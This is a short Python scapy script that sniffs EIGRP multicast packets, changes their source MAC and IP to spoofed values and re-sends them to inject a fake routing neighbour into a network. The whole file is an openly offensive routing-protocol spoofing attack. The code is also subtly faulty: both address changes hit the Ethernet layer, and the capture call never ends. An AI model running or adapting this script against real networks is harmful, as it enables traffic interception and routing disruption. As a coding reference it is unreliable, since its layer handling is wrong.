#Add fake EIGRP neighbor

#import scapy
from scapy.all import *

#Import Eigrp
load_contrib("eigrp")

#sniff for eigrp package
pkt = sniff(filter="ip dst 224.0.0.10")

#change the source mac address
pkt[0].src = "00:00:00:11:22:33"

#Change the source ip address
pkt[0].src = "192.168.1.100"

#change checksums
pkt[0][IP].chksum = None

#send packet into network
sendp(pkt[0], loop=0, verbose=1)